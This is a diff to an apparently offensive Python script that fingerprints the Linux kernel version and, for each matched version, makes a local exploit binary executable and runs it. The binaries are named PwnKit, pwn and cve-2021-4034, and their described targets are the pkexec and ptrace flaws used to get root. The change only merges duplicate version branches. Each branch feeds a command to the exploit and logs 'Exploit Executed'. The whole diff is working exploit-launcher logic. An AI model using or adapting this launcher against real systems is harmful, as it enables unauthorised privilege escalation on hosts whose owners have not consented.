@@ -19,7 +19,7 @@ if operating_system == "Linux":
 
         global kernel_name1
         kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
-        if kernel_name1 == "5.9.0":
+        if kernel_name1 == "5.9.0" or kernel_name1 == "5.7.0" or kernel_name1 == "5.5.0":
             st = os.stat('PwnKit')
             os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
             args = ["./PwnKit"]
@@ -29,24 +29,24 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
             
 
-        elif kernel_name1 == "5.7.0":
-            st = os.stat('PwnKit')
-            os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
-            args = ["./PwnKit"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
+        # elif kernel_name1 == "5.7.0":
+        #     st = os.stat('PwnKit')
+        #     os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
+        #     args = ["./PwnKit"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
             
             
-        elif kernel_name1 == "5.5.0":
-            st = os.stat('PwnKit')
-            os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
-            args = ["./PwnKit"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
+        # elif kernel_name1 == "5.5.0":
+        #     st = os.stat('PwnKit')
+        #     os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
+        #     args = ["./PwnKit"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
             
             
         elif kernel_name1 == "4.19.0":
@@ -59,7 +59,7 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
             
         
-        elif kernel_name1 == "4.18.0":
+        elif kernel_name1 == "4.18.0" or kernel_name1 == "4.15.11" or kernel_name1 == "4.13.0":
             st = os.stat('pwn')
             os.chmod('pwn', st.st_mode | stat.S_IEXEC)
             args = ["./pwn"]
@@ -68,23 +68,23 @@ if operating_system == "Linux":
             print(child_process_output)
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
             
-        elif kernel_name1 == "4.15.11":
-            st = os.stat('pwn')
-            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
-            args = ["./pwn"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
+        # elif kernel_name1 == "4.15.11":
+        #     st = os.stat('pwn')
+        #     os.chmod('pwn', st.st_mode | stat.S_IEXEC)
+        #     args = ["./pwn"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
             
-        elif kernel_name1 == "4.13.0":
-            st = os.stat('pwn')
-            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
-            args = ["./pwn"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
+        # elif kernel_name1 == "4.13.0":
+        #     st = os.stat('pwn')
+        #     os.chmod('pwn', st.st_mode | stat.S_IEXEC)
+        #     args = ["./pwn"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
         elif kernel_name1 == "5.4.0":
             st = os.stat('exploit')
@@ -95,7 +95,7 @@ if operating_system == "Linux":
             print(child_process_output)
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
-        elif kernel_name1 == "5.14.0":
+        elif kernel_name1 == "5.14.0" or kernel_name1 == "5.10.0" or kernel_name1 == "5.15.0":
             st = os.stat('cve-2021-4034')
             os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
             args = ["./cve-2021-4034"]
@@ -104,24 +104,24 @@ if operating_system == "Linux":
             print(child_process_output)
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
         
-        elif kernel_name1 == "5.10.0":
-            st = os.stat('cve-2021-4034')
-            os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
-            args = ["./cve-2021-4034"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
+        # elif kernel_name1 == "5.10.0":
+        #     st = os.stat('cve-2021-4034')
+        #     os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
+        #     args = ["./cve-2021-4034"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
         
 
-        elif kernel_name1 == "5.15.0":
-            st = os.stat('cve-2021-4034')
-            os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
-            args = ["./cve-2021-4034"]
-            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
-            print(child_process_output)
-            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
+        # elif kernel_name1 == "5.15.0":
+        #     st = os.stat('cve-2021-4034')
+        #     os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
+        #     args = ["./cve-2021-4034"]
+        #     child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        #     child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+        #     print(child_process_output)
+        #     dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
         
 
         else:
